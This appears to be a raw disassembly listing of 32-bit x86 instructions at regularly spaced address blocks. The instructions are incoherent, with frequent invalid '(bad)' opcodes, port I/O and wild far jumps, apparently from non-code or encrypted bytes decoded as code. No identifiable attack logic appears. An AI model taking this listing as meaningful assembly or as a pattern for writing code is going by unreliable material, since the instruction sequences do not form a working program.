  41929f:	test   DWORD PTR [esi+0x64],ecx
  4192a2:	cmp    eax,0x8688d062
  4192a7:	test   BYTE PTR [edi],0x2a
  4192aa:	push   0xaa03d6d
  4192af:	cs cli 
  4192b1:	push   esp
  4192b2:	shr    DWORD PTR [esi-0x2b034ba6],0xca
  4192b9:	xor    eax,0x38d55e8a
  4192be:	jecxz  0x4192f2
  4192c0:	inc    eax
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	imul   ebx,DWORD PTR [ecx*4+0x1119224],0xf500
  41934b:	add    BYTE PTR [ebx+0x1c],al
  41934e:	stos   BYTE PTR es:[edi],al
  41934f:	mov    eax,0x88fd93f5
  419354:	ret    
  419355:	rcl    dl,cl
  419357:	jnp    0x41932f
  419359:	mov    si,0xc967
  41935d:	mov    dl,BYTE PTR [edi+0x4a4af1a]
  419363:	cmp    cl,BYTE PTR [eax-0x6b732aee]
  419369:	fwait
  41936a:	in     eax,0x7f
  41936c:	or     eax,0x2885209d
  419371:	mov    dh,BYTE PTR [edi+ecx*4+0x61bf917]
  419378:	or     edx,DWORD PTR ds:0x280381f4
  41937e:	retf   0xd83d
  419381:	pop    ebx
  419382:	mov    ebp,0x99aaf5f0
  419387:	aas    
  419388:	mov    esi,0xa1624d34
  41938d:	and    eax,0xc853ee55
  419392:	and    eax,DWORD PTR [edx+0x7c]
  419395:	or     eax,DWORD PTR [ecx]
  419397:	jae    0x4193f7
  419399:	sar    ebp,1
  41939b:	jb     0x4193c9
  41939d:	mov    ds:0xd4e6db48,eax
  4193a2:	cdq    
  4193a3:	mov    bh,0x2b
  4193a5:	dec    ebx
  4193a6:	xchg   ebx,eax
  4193a7:	xchg   edx,eax
  4193a8:	pop    edi
  4193a9:	fbstp  TBYTE PTR [eax]
  4193ab:	(bad)  
  4193ac:	jmp    0x4193ec
  4193ae:	sub    al,0xd7
  4193b0:	mov    ds:0x254bae65,al
  4193b5:	push   es
  4193b6:	cmp    DWORD PTR [ebp+0x6],edx
  4193b9:	test   edx,esp
  4193bb:	push   0xffffffe8
  4193bd:	call   0xbd92:0xd0df9b44
  4193c4:	adc    al,0x68
  4193c6:	leave  
  4193c7:	loop   0x419391
  4193c9:	stos   DWORD PTR es:[edi],eax
  4193ca:	push   eax
  4193cb:	leave  
  4193cc:	add    eax,0xa23e180e
  4193d1:	cmp    bl,BYTE PTR [ebx]
  4193d3:	sbb    eax,0x3ffcbb4f
  4193d8:	or     eax,0x898e992a
  4193dd:	dec    ecx
  4193de:	popa   
  4193df:	mov    WORD PTR [edx],?
  4193e1:	and    BYTE PTR [ecx],dh
  4193e3:	fldenv [ebx-0x254e44f4]
  4193e9:	stos   BYTE PTR es:[edi],al
  4193ea:	fsubr  QWORD PTR [ebx+0x2a]
  4193ed:	ss repnz stos BYTE PTR es:[edi],al
  4193f0:	jg     0x4193e6
  4193f2:	test   BYTE PTR [edi],0xa0
  4193f5:	call   0x76fc78bf
  4193fa:	pusha  
  4193fb:	in     eax,0xe5
  4193fd:	sub    DWORD PTR [eax],0xc6bcdfba
  419403:	scas   al,BYTE PTR es:[edi]
  419404:	pop    esp
  419405:	xchg   ebp,eax
  419406:	xchg   esi,eax
  419407:	add    al,0xf4
  419409:	mov    esp,DWORD PTR ds:0x5093fde7
  41940f:	outs   dx,DWORD PTR ds:[esi]
  419410:	adc    bh,BYTE PTR [esi+ebp*2+0x39c54b7b]
  419417:	cmp    dl,dl
  419419:	imul   ebp,DWORD PTR [edx],0xffffffeb
  41941c:	jbe    0x419477
  41941e:	into   
  41941f:	imul   esp,DWORD PTR [eax],0x6f
  419422:	mov    cl,0x9f
  419424:	cmp    BYTE PTR [eax+0x514eadf8],ch
  41942a:	xor    ah,BYTE PTR [edi-0x35]
  41942d:	xchg   edx,eax
  41942e:	jmp    0xdfd0:0x689c35f4
  419435:	push   esp
  419436:	push   ebp
  419437:	lahf   
  419438:	dec    eax
  419439:	jg     0x41940b
  41943b:	inc    ecx
  41943c:	lods   al,BYTE PTR ds:[esi]
  41943d:	call   0xa5a65a
	...
  4194b2:	add    BYTE PTR [eax],al
  4194b4:	inc    ecx
  4194b5:	stc    
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	fadd   st,st(0)
  4194c2:	push   ecx
  4194c3:	fild   WORD PTR [edi-0xafffeee]
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [eax-0x724e7985],al
  4194d1:	mov    ds:0x787c0137,al
  4194d6:	and    BYTE PTR [edx+0x28dcf1fc],ch
  4194dc:	cmc    
  4194dd:	xor    dl,BYTE PTR [esi+0x5215288a]
  4194e3:	lods   al,BYTE PTR ds:[esi]
  4194e4:	sbb    ebp,0xf69489ca
  4194ea:	stc    
  4194eb:	repnz xor eax,DWORD PTR [esi+0x5cc01da2]
  4194f2:	cmp    ebp,DWORD PTR [ebp+eax*1+0x4c4a362d]
  4194f9:	sbb    DWORD PTR [edx],0x3900fc9
  4194ff:	mov    edx,0x6790a880
  419504:	(bad)  
  419505:	cmp    BYTE PTR [edi],ch
  419507:	inc    edx
  419508:	mov    al,0x68
  41950a:	ja     0x419508
  41950c:	stos   DWORD PTR es:[edi],eax
  41950d:	mov    bl,0xe0
  41950f:	sbb    BYTE PTR [ecx+0x78],bl
  419512:	add    bl,BYTE PTR [eax-0x42]
  419515:	inc    ebp
  419516:	pusha  
  419517:	fcom   DWORD PTR [eax-0x7d]
  41951a:	clc    
  41951b:	jno    0x419524
  41951d:	jae    0x41953e
  41951f:	sbb    eax,0xa5267866
  419524:	ret    0x56cb
  419527:	inc    ebp
  419528:	lea    ecx,[edx+0x13a1ed20]
  41952e:	cld    
  41952f:	jbe    0x41950c
  419531:	sub    cl,BYTE PTR [esp+ecx*1]
  419534:	fdivr  QWORD PTR [esi]
  419536:	push   esp
  419537:	sub    al,0xaa
  419539:	add    al,0x9c
  41953b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41953c:	pusha  
  41953d:	sbb    ah,BYTE PTR [ecx+0x2fb47f2b]
  419543:	and    BYTE PTR [edi],dh
  419545:	push   eax
  419546:	addr16 cdq 
  419548:	lock enter 0x9aba,0x1a
  41954d:	dec    edi
  41954e:	imul   ebp,DWORD PTR [edi+0x3218b65e],0x58
  419555:	cmp    DWORD PTR [ebx+0x73],ebp
  419558:	out    dx,eax
  419559:	test   eax,0xeb931026
  41955e:	mov    cl,0xdf
  419560:	dec    eax
  419561:	mov    WORD PTR [edi-0x3d2605ee],fs
  419567:	shr    BYTE PTR [esi-0x5a],0x6f
  41956b:	cmp    ebp,DWORD PTR [ecx+0x1b]
  41956e:	inc    BYTE PTR [ebp+0x19]
  419571:	mov    BYTE PTR [ebx],ah
  419573:	jl     0x4195e5
  419575:	adc    al,0xc
  419577:	pop    esi
  419578:	ret    0xf9f4
  41957b:	mov    edx,0x3d0d3603
  419580:	jno    0x4195a5
  419582:	fist   WORD PTR [ebx+ebp*4]
  419585:	push   esp
  419586:	imul   ebp,DWORD PTR [ebx+0x1421abca],0xe1931ffe
  419590:	adc    edi,ecx
  419592:	mov    dh,0xc4
  419594:	(bad)  
  419595:	xchg   esp,eax
  419596:	push   ebp
  419597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419598:	idiv   edi
  41959a:	fisttp WORD PTR [edi+0x4d]
  41959d:	fisttp DWORD PTR [ebx]
  41959f:	popa   
  4195a0:	or     DWORD PTR [esi+0x2a],esi
  4195a3:	pop    esp
  4195a4:	cmp    al,0x96
  4195a6:	push   ss
  4195a7:	and    DWORD PTR [eax+0x52],ebx
  4195aa:	push   edi
  4195ab:	mov    ds:0x1774b9c3,eax
  4195b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195b1:	aad    0xba
  4195b3:	cmp    esi,esp
  4195b5:	lea    esp,ds:0xe4f9d4e5
  4195bb:	jg     0x4195d5
  4195bd:	jno    0x4195fe
  4195bf:	push   ds
  4195c0:	jns    0x4195c2
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax-0x452db7e6]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [esi-0x35],cl
  41964e:	js     0x41961a
  419650:	cmp    ch,BYTE PTR [eax+0x66]
  419653:	pop    ss
  419654:	lea    ecx,[ebp-0x2a]
  419657:	in     eax,0xf0
  419659:	jge    0x419654
  41965b:	pop    es
  41965c:	lock or cl,dh
  41965f:	inc    esp
  419660:	fisub  WORD PTR ds:0x8c60a407
  419666:	pop    esp
  419667:	xor    al,0x32
  419669:	and    BYTE PTR [esi-0x39],bl
  41966c:	jne    0x41961e
  41966e:	add    al,0x44
  419670:	stos   DWORD PTR es:[edi],eax
  419671:	sub    esp,ebp
  419673:	mov    ds:0xa7b35347,al
  419678:	dec    ebx
  419679:	out    dx,al
  41967a:	mov    al,0x29
  41967c:	adc    eax,0x5c0ee963
  419681:	(bad)  
  419682:	cmp    al,0x8b
  419684:	mov    esp,0x84b912c6
  419689:	pop    ss
  41968a:	sbb    al,0x98
  41968c:	popa   
  41968d:	jmp    0x41963e
  41968f:	aaa    
  419690:	jle    0x4196d4
  419692:	inc    ebx
  419693:	mov    esp,DWORD PTR [ecx-0x564563d]
  419699:	sub    BYTE PTR [eax+ecx*1],ah
  41969c:	mov    ebx,0x82b7bbfe
  4196a1:	cdq    
  4196a2:	scas   al,BYTE PTR es:[edi]
  4196a3:	jmp    0xbd21cec9
  4196a8:	mov    BYTE PTR [eax],cl
  4196aa:	and    eax,0x715264
  4196af:	pusha  
  4196b0:	dec    ebp
  4196b1:	mov    ds:0xe5a35f05,eax
  4196b6:	not    dl
  4196b8:	xor    dh,BYTE PTR [esi-0x58]
  4196bb:	call   0xd9054796
  4196c0:	push   esp
  4196c1:	test   eax,0x481f4aed
  4196c6:	xor    BYTE PTR [edi-0x1cd54dd9],dh
  4196cc:	cdq    
  4196cd:	lea    edx,[ebp-0x4]
  4196d0:	adc    dh,BYTE PTR [eax]
  4196d2:	push   edx
  4196d3:	dec    eax
  4196d4:	sub    DWORD PTR [edx],esp
  4196d6:	fdivr  DWORD PTR ds:0xf66ff67e
  4196dc:	das    
  4196dd:	imul   esp,DWORD PTR [ecx],0xffffffe0
  4196e0:	call   0xda5d:0x19c3d0c3
  4196e7:	sbb    esi,eax
  4196e9:	push   ss
  4196ea:	cld    
  4196eb:	repnz stos DWORD PTR es:[edi],eax
  4196ed:	inc    esp
  4196ee:	cli    
  4196ef:	inc    eax
  4196f0:	aad    0xb3
  4196f2:	push   ss
  4196f3:	xchg   esi,eax
  4196f4:	xor    eax,0xfeacb8db
  4196f9:	and    eax,ebx
  4196fb:	mov    eax,0x9862e0e5
  419700:	fs data16 movs BYTE PTR es:[di],BYTE PTR ds:[si]
  419705:	xchg   esi,eax
  419706:	ins    BYTE PTR es:[edi],dx
  419707:	jmp    0x47a3:0x9a5e9367
  41970e:	jae    0x41973b
  419710:	pop    eax
  419711:	dec    edi
  419712:	sub    al,0x5e
  419714:	pop    edx
  419715:	xor    DWORD PTR [esi+0x3ef0797a],edx
  41971b:	mov    dl,0x1a
  41971d:	and    BYTE PTR [ebx-0x43],dl
  419720:	adc    DWORD PTR [ebx],esi
  419722:	jno    0x41975e
  419724:	jae    0x41972f
  419726:	adc    BYTE PTR [edi+0x31a7cdad],ch
  41972c:	ret    0x4510
  41972f:	sub    dl,BYTE PTR [ebx]
  419731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419732:	mov    bh,0x7d
  419734:	ss dec eax
  419736:	jp     0x419769
  419738:	dec    esp
  419739:	cmp    eax,0x7df8d2c4
  41973e:	xchg   ebp,eax
  41973f:	mov    dh,0x3
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x7e27cbe9]
  4197c1:	adc    al,0x5d
  4197c3:	dec    ecx
  4197c4:	jno    0x4197da
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	cmc    
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [esi-0x2f],dl
  4197ce:	xchg   edi,eax
  4197cf:	js     0x419767
  4197d1:	inc    ebx
  4197d2:	aas    
  4197d3:	sbb    eax,0x540e3eb6
  4197d8:	ins    DWORD PTR es:[edi],dx
  4197d9:	push   ss
  4197da:	and    DWORD PTR [ebp+0x7a],0xffffff97
  4197de:	adc    eax,0x36881419
  4197e3:	call   0xa31c1e6f
  4197e8:	sub    edx,DWORD PTR [ebx-0x60]
  4197eb:	fwait
  4197ec:	cmp    al,BYTE PTR [ecx-0x71582687]
  4197f2:	jmp    0x419777
  4197f4:	pop    edx
  4197f5:	popf   
  4197f6:	les    esi,FWORD PTR [edx]
  4197f8:	int3   
  4197f9:	popf   
  4197fa:	daa    
  4197fb:	inc    edi
  4197fc:	sub    ebp,ebx
  4197fe:	hlt    
  4197ff:	inc    ecx
  419800:	gs mov ch,0x6d
  419803:	lahf   
  419804:	add    BYTE PTR [ecx],0xc6
  419807:	and    bl,BYTE PTR [esi]
  419809:	aad    0x1c
  41980b:	aas    
  41980c:	in     al,dx
  41980d:	fidivr WORD PTR [edx+0x70]
  419810:	je     0x4197ab
  419812:	enter  0x3b08,0xdf
  419816:	ret    
  419817:	and    eax,0xcf761f5a
  41981c:	or     eax,DWORD PTR [ecx-0xd]
  41981f:	stos   BYTE PTR es:[edi],al
  419820:	cmp    al,0xaa
  419822:	out    dx,al
  419823:	fwait
  419824:	ds pop edi
  419826:	mov    ds:0xbfdc8aa0,eax
  41982b:	dec    edx
  41982c:	mov    ebp,0x7ce4208c
  419831:	cs cld 
  419833:	ret    0xed09
  419836:	and    eax,0x32712c2c
  41983b:	cli    
  41983c:	rcl    DWORD PTR [edi+0x43f5916d],0x9b
  419843:	(bad)  
  419845:	mov    DWORD PTR [eax],ebp
  419847:	ins    BYTE PTR es:[edi],dx
  419848:	and    esp,0x61
  41984b:	mov    ah,0xbd
  41984d:	or     al,0xe1
  41984f:	ins    DWORD PTR es:[edi],dx
  419850:	call   0x85e40255
  419855:	(bad)  
  419856:	mov    esi,0x3b2cd98b
  41985b:	mov    ecx,0x1a4a9906
  419860:	loopne 0x419809
  419862:	cdq    
  419863:	test   BYTE PTR [esi],0x87
  419866:	push   ebp
  419867:	and    edi,DWORD PTR [ebp+0x5db45fb2]
  41986d:	mov    esp,0x549970f7
  419872:	or     bl,dl
  419874:	adc    ebp,eax
  419876:	into   
  419877:	gs pop ebp
  419879:	sbb    DWORD PTR [esi-0xa],0x3
  41987d:	add    al,0x48
  41987f:	arpl   WORD PTR [ebp-0x10],dx
  419882:	cdq    
  419883:	or     ch,dl
  419885:	das    
  419886:	or     ebx,DWORD PTR [ebx+0x410bbd01]
  41988c:	jg     0x419813
  41988e:	aad    0xad
  419890:	or     DWORD PTR [esi-0x37],ebx
  419893:	out    0xc7,al
  419895:	inc    esp
  419896:	cmp    DWORD PTR [ebx+0x6a],0xe1c501b0
  41989d:	mov    esp,0x786c9e97
  4198a2:	push   ebp
  4198a3:	jmp    0x419876
  4198a5:	mov    ecx,0x8cd19680
  4198aa:	in     eax,0x83
  4198ac:	and    al,0x6b
  4198ae:	dec    esp
  4198af:	jge    0x41991d
  4198b1:	inc    ebx
  4198b2:	lds    ebx,FWORD PTR [edi]
  4198b4:	add    BYTE PTR [ebx-0x71a8d94],bl
  4198ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198bb:	dec    edi
  4198bc:	xchg   esp,eax
  4198bd:	es into 
  4198bf:	add    esp,ebp
	...
  419931:	add    BYTE PTR [eax],al
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	or     ch,al
  419942:	pop    edi
  419943:	jmp    0xf5:0x11566
  41994a:	add    BYTE PTR [eax],al
  41994c:	scas   al,BYTE PTR es:[edi]
  41994d:	mov    esi,0x1e2b2866
  419952:	repnz mov al,ds:0x2a858288
  419958:	mov    dh,0xcd
  41995a:	loop   0x419959
  41995c:	cmp    ch,bl
  41995e:	into   
  41995f:	or     ebp,DWORD PTR [esi-0x57010a38]
  419965:	arpl   ax,di
  419967:	in     eax,0xe6
  419969:	in     eax,0x27
  41996b:	jp     0x419953
  41996d:	addr16 pop es
  41996f:	xchg   esp,eax
  419970:	stos   DWORD PTR es:[edi],eax
  419971:	cmp    al,0x11
  419973:	push   0xdcf6b676
  419978:	fidivr DWORD PTR [ebp+0x4e]
  41997b:	movups XMMWORD PTR [esi],xmm5
  41997e:	jle    0x419923
  419980:	add    ch,bl
  419982:	jmp    0xcf1e:0x609dc6fd
  419989:	mov    ds:0x9df21384,eax
  41998e:	sub    dh,BYTE PTR [ebx-0x4549e13]
  419994:	in     al,dx
  419995:	push   esi
  419996:	pop    edx
  419997:	test   al,0x84
  419999:	mov    dh,dh
  41999b:	imul   ecx,DWORD PTR [esi-0x388836d0],0x30
  4199a2:	mov    ds:0x5ec60202,eax
  4199a7:	sbb    dh,BYTE PTR ds:0xaaeda4e5
  4199ad:	ds mov eax,esp
  4199b0:	inc    edi
  4199b1:	jbe    0x419962
  4199b3:	mov    ebx,0x12a97920
  4199b8:	xor    bl,BYTE PTR [esi-0x18]
  4199bb:	xchg   esi,eax
  4199bc:	(bad)
  4199c0:	mov    fs:0xba50e9ca,al
  4199c6:	fisubr DWORD PTR [ebp+0x5b]
  4199c9:	lods   eax,DWORD PTR ds:[esi]
  4199ca:	je     0x419a40
  4199cc:	inc    ecx
  4199cd:	das    
  4199ce:	loopne 0x419966
  4199d0:	test   eax,0xf40024a2
  4199d5:	aam    0x76
  4199d7:	add    eax,0xda2c407b
  4199dc:	imul   edi,edx,0x67c8248f
  4199e2:	arpl   WORD PTR ds:0x2069fe83,sp
  4199e8:	repnz scas eax,DWORD PTR es:[edi]
  4199ea:	jmp    0x47effdbe
  4199ef:	push   ss
  4199f0:	aam    0x96
  4199f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f3:	ja     0x419a5e
  4199f5:	pop    ds
  4199f6:	pop    esp
  4199f7:	pop    esi
  4199f8:	test   dh,dh
  4199fa:	mov    ch,0x91
  4199fc:	push   cs
  4199fd:	pop    esp
  4199fe:	xor    BYTE PTR [esi],bl
  419a00:	test   BYTE PTR [ecx-0x10],bl
  419a03:	adc    al,0x42
  419a05:	idiv   DWORD PTR [esi+ebp*8]
  419a08:	push   ss
  419a09:	popf   
  419a0a:	jbe    0x4199bd
  419a0c:	into   
  419a0d:	sbb    DWORD PTR [edx-0x55],edx
  419a10:	test   BYTE PTR [edi-0x37],0x54
  419a14:	mov    BYTE PTR [esi-0x1bae596],dh
  419a1a:	or     DWORD PTR [eax+edx*8],0x3779c773
  419a21:	push   ebp
  419a22:	loop   0x4199d0
  419a24:	fidivr DWORD PTR [ebp+ecx*8-0x43]
  419a28:	push   ebx
  419a29:	sbb    BYTE PTR [edx+esi*8-0x69848c21],ch
  419a30:	test   ah,al
  419a32:	pop    ebx
  419a33:	and    DWORD PTR [ebx],edx
  419a35:	scas   al,BYTE PTR es:[edi]
  419a36:	xchg   esi,eax
  419a37:	lods   al,BYTE PTR ds:[esi]
  419a38:	es xchg esp,eax
  419a3a:	inc    ebp
  419a3b:	cmp    BYTE PTR [eax-0x25dcb6f8],bl
	...
  419ab1:	add    BYTE PTR [eax],al
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0xd2357b47
  419ac1:	cdq    
  419ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ac3:	mov    WORD PTR [ebx+0x16],ds
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	cmc    
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    BYTE PTR [ebx-0x7636f712],ah
  419ad1:	repnz lods eax,DWORD PTR ds:[esi]
  419ad3:	fdivr  DWORD PTR [ebx-0x47]
  419ad6:	in     eax,dx
  419ad7:	jns    0x419adf
  419ad9:	jb     0x419b48
  419adb:	sbb    cl,BYTE PTR [esi]
  419add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ade:	ja     0x419ae8
  419ae0:	sbb    ecx,DWORD PTR [ecx-0x42]
  419ae3:	or     DWORD PTR [edx+0xb],ebp
  419ae6:	cmp    eax,0xead4e23d
  419aeb:	or     bh,BYTE PTR [eax+ebx*8]
  419aee:	ror    eax,cl
  419af0:	popf   
  419af1:	xor    DWORD PTR [ebp+ebp*8-0x5af411d],esp
  419af8:	dec    edx
  419af9:	outs   dx,BYTE PTR ds:[esi]
  419afa:	imul   ebx,DWORD PTR [ebp+0x69],0xca85f001
  419b01:	mov    BYTE PTR [edx+0x756c6724],ch
  419b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b08:	enter  0xf4f5,0xf3
  419b0c:	mov    bl,0x3a
  419b0e:	or     esi,DWORD PTR [edi-0xe]
  419b11:	adc    eax,0x91771a6c
  419b16:	xchg   BYTE PTR [ebp-0x4166a905],bl
  419b1c:	mov    esp,0xb1214caa
  419b21:	pop    edx
  419b22:	cmp    ah,dl
  419b24:	icebp  
  419b25:	sbb    al,0xd5
  419b27:	mov    edi,0xdff7c788
  419b2c:	out    0x69,eax
  419b2e:	cmp    bh,0x20
  419b31:	in     eax,dx
  419b32:	int    0xb
  419b34:	fs jp  0x419ac8
  419b37:	sbb    al,0xd3
  419b39:	call   0x7747:0xb51e4d7
  419b40:	push   ds
  419b41:	daa    
  419b42:	shr    BYTE PTR [edi+ebp*8-0x35],0x80
  419b47:	retf   
  419b48:	dec    ecx
  419b49:	aaa    
  419b4a:	sbb    esi,DWORD PTR [edx-0x7b]
  419b4d:	inc    edx
  419b4e:	adc    BYTE PTR [ebx-0x273844d1],bl
  419b54:	rcr    BYTE PTR [ecx],0x81
  419b57:	loop   0x419b88
  419b59:	cwde   
  419b5a:	mul    BYTE PTR [ebx+0x70]
  419b5d:	pop    es
  419b5e:	sub    eax,0x2277d9ef
  419b63:	call   0x4dd2:0x389fe2d0
  419b6a:	sbb    al,0x1d
  419b6c:	in     al,0x61
  419b6e:	xor    DWORD PTR [ecx],eax
  419b70:	mov    dh,0x6a
  419b72:	and    ah,bh
  419b74:	pusha  
  419b75:	in     eax,dx
  419b76:	ss pop ds
  419b78:	xor    cl,BYTE PTR ds:0x64011dd9
  419b7e:	enter  0xcf10,0x10
  419b82:	or     eax,0x1d7147c2
  419b87:	loope  0x419ba6
  419b89:	sub    dh,BYTE PTR [eax-0x7b]
  419b8c:	sbb    dl,BYTE PTR [esi-0x3c213307]
  419b92:	pop    ss
  419b93:	fisubr DWORD PTR [ebx-0x33]
  419b96:	xchg   edx,eax
  419b97:	sar    DWORD PTR [edx+0x656f67ae],1
  419b9d:	fstp   st(4)
  419b9f:	iret   
  419ba0:	adc    ah,dl
  419ba2:	push   ebp
  419ba3:	mov    BYTE PTR [ebp-0x26],bh
  419ba6:	pushf  
  419ba7:	lods   al,BYTE PTR ds:[esi]
  419ba8:	mov    bl,0xe2
  419baa:	inc    edi
  419bab:	in     eax,0x35
  419bad:	pushf  
  419bae:	sbb    DWORD PTR [ecx+0x670fe06a],ebx
  419bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb5:	fdivp  st(0),st
  419bb7:	sbb    BYTE PTR [eax+ecx*2],ah
  419bba:	mov    bh,0x55
  419bbc:	cwde   
  419bbd:	xor    eax,0xe33995
	...
  419c32:	add    BYTE PTR [eax],al
  419c34:	sti    
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0x14
  419c41:	mov    WORD PTR es:[edi+0x50],cs
  419c45:	pop    ss
  419c46:	add    DWORD PTR [eax],eax
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    BYTE PTR [ecx],bl
  419c4d:	aas    
  419c4e:	fimul  WORD PTR [ebx+0x6724ccb]
  419c54:	pop    eax
  419c55:	aas    
  419c56:	out    0xd6,al
  419c58:	mov    dh,0x13
  419c5a:	sub    ebp,esp
  419c5c:	mov    ebx,DWORD PTR [eax-0x71]
  419c5f:	(bad)  
  419c60:	jle    0x419cbf
  419c62:	pop    ebx
  419c63:	popf   
  419c64:	push   ds
  419c65:	fwait
  419c66:	mov    ecx,0xd795791b
  419c6b:	push   es
  419c6c:	mov    cl,0xbb
  419c6e:	nop
  419c6f:	mov    dh,0x77
  419c71:	and    BYTE PTR [ecx+0x29e7f853],bl
  419c77:	out    0x89,al
  419c79:	(bad)  
  419c7a:	mov    bh,0x5f
  419c7c:	stc    
  419c7d:	mov    eax,0xaf5d69d3
  419c82:	(bad)  
  419c84:	mov    ebx,0x1f8c51a6
  419c89:	daa    
  419c8a:	aaa    
  419c8b:	pop    ebp
  419c8c:	int3   
  419c8d:	and    BYTE PTR [esi],dl
  419c8f:	or     al,0x44
  419c91:	and    eax,0x86ba798b
  419c96:	ror    DWORD PTR [ebx-0x1ceafa4e],0x5b
  419c9d:	or     eax,0x1ae6fbba
  419ca2:	frstor [esi+0x39a29834]
  419ca8:	mov    ?,WORD PTR [esi+eiz*8+0x436d3df5]
  419caf:	adc    BYTE PTR [esi+esi*2-0x22b6863d],cl
  419cb6:	dec    ebp
  419cb7:	mov    edx,0xf986340f
  419cbc:	sti    
  419cbd:	push   edx
  419cbe:	adc    BYTE PTR [esi-0xe],0x16
  419cc2:	pop    edi
  419cc3:	(bad)  
  419cc4:	jo     0x419ce8
  419cc6:	repz les esi,FWORD PTR [ebp+ebx*2+0x61c76834]
  419cce:	pushf  
  419ccf:	xchg   ecx,eax
  419cd0:	mov    dl,0xe8
  419cd2:	js     0x419d11
  419cd4:	mov    edx,0x7cddf327
  419cd9:	stos   BYTE PTR es:[edi],al
  419cda:	pop    esi
  419cdb:	int    0xe3
  419cdd:	cmp    DWORD PTR [ecx],ebx
  419cdf:	jp     0x419d3a
  419ce1:	dec    ebx
  419ce2:	xor    DWORD PTR [esi],edi
  419ce4:	push   0x88d3adfd
  419ce9:	xchg   dh,ch
  419ceb:	fbstp  TBYTE PTR [ecx+0x5e7562cb]
  419cf1:	push   ecx
  419cf2:	cli    
  419cf3:	dec    ebp
  419cf4:	fmul   QWORD PTR [ebp-0x4dcb269d]
  419cfa:	cwde   
  419cfb:	shl    BYTE PTR [ebp+0x1e2d66b0],1
  419d01:	dec    ecx
  419d02:	pop    ss
  419d03:	loope  0x419d41
  419d05:	mov    esp,0x51fe2d2c
  419d0a:	test   eax,0x4fd788a7
  419d0f:	mov    esp,cs
  419d11:	jp     0x419c94
  419d13:	fmul   QWORD PTR [esi-0x77]
  419d16:	inc    esi
  419d17:	cmp    DWORD PTR [ebx],edx
  419d19:	jg     0x419d45
  419d1b:	jae    0x419d93
  419d1d:	jge    0x419d4d
  419d1f:	mov    al,ds:0x8d718d9f
  419d24:	cli    
  419d25:	xchg   ecx,eax
  419d26:	mov    edx,0xeb22c768
  419d2b:	mov    dh,0xb
  419d2d:	mov    gs,WORD PTR [eax-0x63]
  419d30:	pop    esp
  419d31:	fs je  0x419d40
  419d34:	jb     0x419d6d
  419d36:	adc    bl,0x23
  419d39:	dec    esi
  419d3a:	adc    BYTE PTR [ebp+eiz*8-0x7fc5275f],0x0
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	pop    es
  419dc1:	sti    
  419dc2:	or     DWORD PTR [ecx+0x45],edi
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    ch,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [ebx],dh
  419dcd:	mov    bh,0x24
  419dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd0:	imul   ecx,eax,0x51
  419dd3:	cmc    
  419dd4:	aas    
  419dd5:	ins    DWORD PTR es:[edi],dx
  419dd6:	pop    ss
  419dd7:	mov    al,ds:0x28f483dc
  419ddc:	pusha  
  419ddd:	mov    ebx,DWORD PTR [ecx+0x75]
  419de0:	sub    BYTE PTR [ebp-0x299d14f3],0xf8
  419de7:	(bad)  
  419de8:	jmp    0xe4f3:0xea8ae26d
  419def:	mov    DWORD PTR [esi-0x744e5621],ebx
  419df5:	sub    bh,0x59
  419df8:	les    edi,FWORD PTR [ecx-0x3a]
  419dfb:	lods   al,BYTE PTR ds:[esi]
  419dfc:	mov    gs,WORD PTR [ecx]
  419dfe:	cs jmp 0x62131e60
  419e04:	(bad)  
  419e05:	mov    eax,ds:0xb76290d3
  419e0a:	cmp    eax,0xc8ce5633
  419e0f:	xchg   ebx,eax
  419e10:	adc    BYTE PTR [edi],bl
  419e12:	xor    al,0x34
  419e14:	call   0x78ee2519
  419e19:	ins    BYTE PTR es:[edi],dx
